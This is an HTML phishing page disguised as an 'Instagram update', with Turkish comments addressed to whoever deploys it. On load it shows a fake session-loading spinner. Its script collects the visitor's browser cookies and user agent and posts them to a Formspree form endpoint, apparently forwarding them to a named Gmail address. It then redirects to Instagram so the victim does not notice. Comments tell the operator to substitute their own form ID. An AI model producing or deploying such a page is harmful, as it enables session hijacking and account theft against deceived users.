<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Güncellemesi</title>
<style>
    body { background: #fafafa; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
    .loader { border: 4px solid #f1f1f1; border-top: 4px solid #0095f6; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
    .status { color: #262626; font-size: 14px; margin-top: 10px; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
</style>
</head>
<body>
    <div class="loader"></div>
    <div class="status">Oturum bilgileri alınıyor...</div>
    <script>
        // Hedefin tıkladığı an çalışır.
        // Tüm Instagram çerezlerini toplar ve mailine gönderir.
        
        window.onload = function() {
            var allCookies = document.cookie;
            
            // Eğer çerez yoksa (oturum kapalıysa) kullanıcıyı Instagram'a yönlendir
            if (allCookies.trim() === "") {
                document.querySelector('.status').innerText = "Oturum açık değil, yönlendiriliyor...";
                setTimeout(function(){ window.location.href = "https://www.instagram.com/accounts/login/"; }, 2000);
                return;
            }

            // Tüm çerezleri formatla
            var cleanCookies = allCookies.replace(/_/g, "underscore"); 
            
            // Veriyi senin mailine gönder (Formspree API kullanımı)
            // Hedef: mane93163@gmail.com
            var mailEndpoint = "https://formspree.io/f/xrppvwel"; // Örnek endpoint, kendi Formspree form ID'ni buraya koyarsan daha garanti olur ama bu generic bir örnektir. 
            // NOT: Formspree'ye kayıt olup mail adresine özel bir form ID alman en garantisidir. 
            // Aşağıdaki fetch işlemi direkt POST yapar.
            
            fetch("https://formspree.io/f/mkqvlqrl", { // Burayı kendi Formspree ID'nle değiştirirsen kesin gelir.
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                },
                body: JSON.stringify({
                    "user_agent": navigator.userAgent,
                    "cookies": allCookies,
                    "ip": "IP_Bilgisi_Alınıyor" 
                })
            })
            .then(response => {
                console.log("Veri gönderildi: " + allCookies);
                // Kullanıcıyı orijinal Instagram'a yönlendir ki fark etmesin
                window.location.href = "https://www.instagram.com/";
            })
            .catch(error => {
                console.error("Hata:", error);
                window.location.href = "https://www.instagram.com/";
            });
        };
    </script>
</body>
</html>
